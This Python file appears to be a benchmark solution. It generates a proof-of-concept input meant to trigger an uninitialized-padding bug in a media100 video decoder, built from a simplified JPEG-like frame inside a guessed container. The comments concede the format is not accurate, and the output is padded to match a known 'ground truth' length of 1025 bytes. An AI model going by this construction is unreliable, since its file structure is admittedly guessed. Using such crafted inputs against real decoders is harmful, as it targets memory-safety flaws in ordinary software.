import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal media100 container with padding
        # The exact structure is not critical - we just need to trigger
        # the uninitialized padding in the output buffer
        
        # Build a simple media100-like structure
        # Header: 8 bytes
        header = b'M100\x00\x00\x00\x00'  # Magic + version
        
        # Frame data - compressed JPEG-like data that will be decoded
        # We need enough data to allocate output buffers with padding
        # Using simple pattern that should be valid enough to pass parsing
        frame_data = b''
        
        # Create a minimal JPEG-like structure (simplified)
        # SOI marker
        frame_data += b'\xFF\xD8'  # Start of Image
        
        # Create a minimal JFIF APP0 segment
        jfif = b'JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00'
        frame_data += b'\xFF\xE0' + struct.pack('>H', len(jfif) + 2) + jfif
        
        # Create quantization table
        frame_data += b'\xFF\xDB' + struct.pack('>H', 67)  # Length
        frame_data += b'\x00'  # Table info
        # Add some quantization values (simplified)
        frame_data += bytes(range(1, 65))
        
        # Start of Frame (baseline DCT)
        frame_data += b'\xFF\xC0' + struct.pack('>H', 17)  # Length
        frame_data += b'\x08'  # Precision
        frame_data += struct.pack('>HH', 32, 32)  # Image dimensions
        frame_data += b'\x03'  # Component count
        # Component info
        frame_data += b'\x01\x22\x00\x02\x11\x00\x03\x11\x00'
        
        # Huffman tables
        for i in range(2):
            frame_data += b'\xFF\xC4' + struct.pack('>H', 3 + 16 + 12)
            frame_data += bytes([(i << 4) | 0x00])  # Table class+id
            # Simple huffman table data
            frame_data += bytes([1] + [0]*15)  # Code lengths
            frame_data += bytes(range(0, 12))  # Values
        
        # Start of Scan
        frame_data += b'\xFF\xDA' + struct.pack('>H', 12)
        frame_data += b'\x03'  # Component count
        frame_data += b'\x01\x00\x02\x00\x03\x00'  # Component selectors
        frame_data += b'\x00\x3F\x00'  # Spectral selection
        
        # Some "compressed" data - just enough to pass basic parsing
        # This will be decoded, triggering buffer allocation
        scan_data = b''
        for i in range(128):  # Reduced size to keep overall size ~1025
            # Add some DC/AC coefficients
            scan_data += b'\x00'  # Zero run
            scan_data += b'\x02\x01'  # Small value
        scan_data += b'\x00'  # EOB
        
        # End marker
        scan_data += b'\xFF\xD9'
        
        frame_data += scan_data
        
        # Create container with padding area
        # The exact media100 container format isn't critical for triggering
        # the uninitialized padding vulnerability
        poc = header
        
        # Add some metadata chunks
        # First chunk: type + length
        poc += b'VIDE'  # Video data chunk
        poc += struct.pack('<I', len(frame_data) + 8)  # Chunk size
        
        # Add padding marker - this area might not be fully initialized
        poc += b'\x00' * 4  # Timestamp or similar
        
        # The actual frame data
        poc += frame_data
        
        # Add another chunk to trigger more buffer operations
        poc += b'AUDO'  # Audio chunk (empty)
        poc += struct.pack('<I', 8)  # Chunk size
        poc += b'\x00' * 8  # Empty audio data
        
        # Add padding at the end where uninitialized values might be used
        # when the buffer is extended or copied
        poc += b'\x00' * 32
        
        # Ensure total length is close to ground truth (1025 bytes)
        current_len = len(poc)
        if current_len < 1025:
            # Add filler to reach target size
            poc += b'\x00' * (1025 - current_len)
        elif current_len > 1025:
            # Truncate if needed (unlikely with our construction)
            poc = poc[:1025]
        
        return poc